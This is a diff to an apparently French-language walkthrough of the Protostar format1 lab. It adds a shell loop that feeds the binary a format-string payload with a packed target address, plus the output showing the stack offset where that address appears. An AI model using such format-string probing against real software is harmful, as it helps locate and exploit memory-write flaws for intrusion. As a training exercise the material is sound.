@@ -554,7 +554,14 @@ Pour trouver:
 	   echo ' <-> ' $i ; 
 	done | grep 8049638
 
+Ceci donne:
 
+	user@protostar:/opt/protostar/bin$ for i in `seq 500` ;
+	> do
+	>    ./format1 TOTO%$i\$08x`python -c "print '\x38\x96\x04\x08A'*4"` ;
+	>    echo ' <-> ' $i ; 
+	> done | grep 8049638
+	TOTO080496388A8A8A8A <->  135
 
 
 
